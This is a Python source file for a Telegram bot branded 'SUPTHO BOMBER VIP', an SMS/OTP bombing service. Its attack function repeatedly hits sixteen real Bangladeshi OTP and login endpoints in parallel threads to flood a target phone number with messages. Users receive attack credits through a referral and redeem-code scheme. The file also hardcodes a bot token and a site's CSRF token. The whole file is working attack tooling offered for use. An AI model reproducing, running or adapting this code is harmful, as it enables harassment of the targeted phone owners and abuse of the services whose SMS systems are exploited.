import telebot
import requests
import threading
import time
import os
import json
import random
import string
from flask import Flask

# ==========================================
# 🌐 WEB SERVER (For Render)
# ==========================================
app = Flask('')
@app.route('/')
def home(): return "Bot is Running Successfully!"

def run_web_server():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

def keep_alive():
    t = threading.Thread(target=run_web_server, daemon=True)
    t.start()

# ==========================================
# 🔧 CONFIGURATION
# ==========================================
API_TOKEN = '8577991344:AAFyp9TUo-BrzgUpO1ZRoy6fjnc41hBG4GM'  # <--- Bot Token boshon
OWNER_ID = 6941003064              # <--- Apnar numeric ID boshon
OWNER_NAME = "Suptho Hpd"
OWNER_USERNAME = "@Suptho1_"
CHANNEL_ID = "@SH_tricks"         
DATA_FILE = 'bot_db.json'

bot = telebot.TeleBot(API_TOKEN)

# ==========================================
# 💾 DATABASE MANAGER
# ==========================================
def load_data():
    if not os.path.exists(DATA_FILE):
        return {"users": {}, "codes": [], "whitelist": [], "banned": []}
    try:
        with open(DATA_FILE, 'r') as f: return json.load(f)
    except: return {"users": {}, "codes": [], "whitelist": [], "banned": []}

def save_data(data):
    with open(DATA_FILE, 'w') as f: json.dump(data, f, indent=4)

db = load_data()

# ==========================================
# 🛡️ JOIN CHECKER & HELPERS
# ==========================================
def is_user_joined(user_id):
    try:
        member = bot.get_chat_member(CHANNEL_ID, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except: return False

# ==========================================
# 🚀 API ENGINE (Your Fast Logic + All My APIs)
# ==========================================
def api_hit(url, method, data=None, json=None, headers=None):
    try:
        head = {"User-Agent": "Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36"}
        if headers: head.update(headers)
        if method == "POST":
            requests.post(url, data=data, json=json, headers=head, timeout=3)
        else:
            requests.get(url, headers=head, timeout=3)
    except: pass

def attack_all_apis(target):
    # --- Apnar Fast Settings Mechanism ---
    # 1. OTT APIs
    api_hit(f"https://www.bioscopelive.com/en/login/send-otp?phone=88{target}", "GET")
    api_hit("https://api-dynamic.chorki.com/v2/auth/login?country=BD&platform=web", "POST", json={"number": "+88"+target})
    api_hit(f"https://api.hoichoi.tv/users/otp?phone={target}&country_code=880", "GET")
    # 2. Finance & Shop APIs
    api_hit("https://api.apex4u.com/api/auth/login", "POST", json={"phoneNumber": target})
    api_hit("https://shopbasebd.com/store/registration/sendOTP", "POST", data={"number": target, "_token": "ktrqcmKSAn8cP3vZvw3xkbav2ww65eRvaikWKDFo"})
    api_hit(f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}", "GET")
    # 3. Telco APIs
    api_hit("https://web-api.banglalink.net/api/v1/user/otp-login/request", "POST", json={"mobile": target})
    api_hit("https://webloginda.grameenphone.com/backend/api/v1/otp", "POST", data={"msisdn": target})
    # 4. Transportation & Edu
    api_hit("https://api.retail.jatri.co/auth/api/v1/send-otp", "POST", json={"phone": target, "purpose": "USER_LOGIN"})
    api_hit("https://api.shikho.com/auth/v2/send/sms", "POST", json={"phone": "88"+target, "type": "student"})
    api_hit("https://api.ostad.app/api/v2/user/with-otp", "POST", json={"msisdn": target})
    api_hit("https://api.swap.com.bd/api/v1/send-otp", "POST", json={"phone": target})
    # 5. Delivery & Extra
    api_hit(f"https://backoffice.ecourier.com.bd/api/web/individual-send-otp?mobile={target}", "GET")
    api_hit("https://app.eonbazar.com/api/auth/register", "POST", json={"mobile": target})
    api_hit(f"https://api.shadhinmusic.com/api/v1/auth/otp?phone={target}", "GET")
    api_hit(f"https://cineplexbd.com/api/v1/send-otp?phone={target}", "GET")

# ==========================================
# 💣 ATTACK MANAGER (Exact Your Logic)
# ==========================================
def start_attack(chat_id, target, amount):
    msg = bot.send_message(chat_id, "⚡ **System Initializing...**", parse_mode='Markdown')
    time.sleep(1)
    
    bot.edit_message_text(f"🚀 **Attack Launched!**\n\n🎯 Target: `{target}`\n💣 Amount: `{amount}`\n☠️ Status: **Bombing...**", chat_id, msg.message_id, parse_mode='Markdown')
    
    sent = 0
    for i in range(amount):
        # Exact threading logic for speed
        threading.Thread(target=attack_all_apis, args=(target,)).start()
        sent += 1
        if sent % 10 == 0:
            try:
                bot.edit_message_text(f"💣 **Bombing in Progress...**\n\n🎯 Target: `{target}`\n🔥 Sent: {sent}/{amount}\n⚡ APIs: Active", chat_id, msg.message_id, parse_mode='Markdown')
            except: pass
        # Kono delay nai, just threading engine run hobe
    
    bot.edit_message_text(f"✅ **Mission Completed!**\n\n🎯 Target: `{target}`\n🔥 Total Sent: {sent}\n👑 **Power By: {OWNER_NAME}**", chat_id, msg.message_id, parse_mode='Markdown')

# ==========================================
# 🤖 COMMANDS & UI (Premium Added)
# ==========================================
@bot.message_handler(commands=['start'])
def welcome(message):
    uid = str(message.from_user.id)
    if uid not in db['users']:
        db['users'][uid] = {"credits": 5, "joined": True}
        save_data(db)

    text = f"🔥 **SUPTHO BOMBER VIP** 🔥\n\nTarget set korte /bomb use korun ba button select korun."
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    markup.add("🚀 Start Bomb", "💳 My Balance", "👥 Refer & Earn", "💰 Redeem Credit")
    bot.send_message(message.chat.id, text, reply_markup=markup, parse_mode='Markdown')

@bot.message_handler(func=lambda m: True)
def handle_all(message):
    uid = str(message.from_user.id)
    if not is_user_joined(message.from_user.id):
        return bot.reply_to(message, "❌ Join @SH_tricks first!")

    if message.text == "🚀 Start Bomb":
        msg = bot.reply_to(message, "💣 ১১ ডিজিটের নাম্বার দিন:")
        bot.register_next_step_handler(msg, ask_amount)
    elif message.text == "💳 My Balance":
        cred = "Unlimited" if int(uid) == OWNER_ID else db['users'].get(uid, {}).get('credits', 0)
        bot.reply_to(message, f"💰 Balance: {cred} Credits")
    elif message.text == "👥 Refer & Earn":
        bot.reply_to(message, f"🎁 Refer Link: https://t.me/{bot.get_me().username}?start={uid}")
    elif message.text == "💰 Redeem Credit":
        msg = bot.reply_to(message, "🎁 Redeem Code দিন:")
        bot.register_next_step_handler(msg, use_redeem)

def ask_amount(message):
    target = message.text.strip()
    if len(target) != 11: return bot.reply_to(message, "⚠️ Incorrect number.")
    msg = bot.reply_to(message, f"🎯 Target: {target}\n🔢 Amount (Max 100):")
    bot.register_next_step_handler(msg, process_bomb, target)

def process_bomb(message, target):
    uid = str(message.from_user.id)
    try:
        amount = int(message.text)
        if amount > 100: amount = 100
        
        # Credit Check
        if int(uid) != OWNER_ID:
            if db['users'][uid]['credits'] < 1: return bot.reply_to(message, "⚠️ No Credits!")
            db['users'][uid]['credits'] -= 1
            save_data(db)

        threading.Thread(target=start_attack, args=(message.chat.id, target, amount)).start()
    except: bot.reply_to(message, "❌ Error amount.")

def use_redeem(message):
    code = message.text.strip()
    if code in db['codes']:
        db['codes'].remove(code)
        db['users'][str(message.from_user.id)]['credits'] += 5
        save_data(db); bot.reply_to(message, "✅ Success!")
    else: bot.reply_to(message, "❌ Invalid.")

if __name__ == "__main__":
    try: bot.remove_webhook()
    except: pass
    keep_alive()
    bot.polling(non_stop=True)
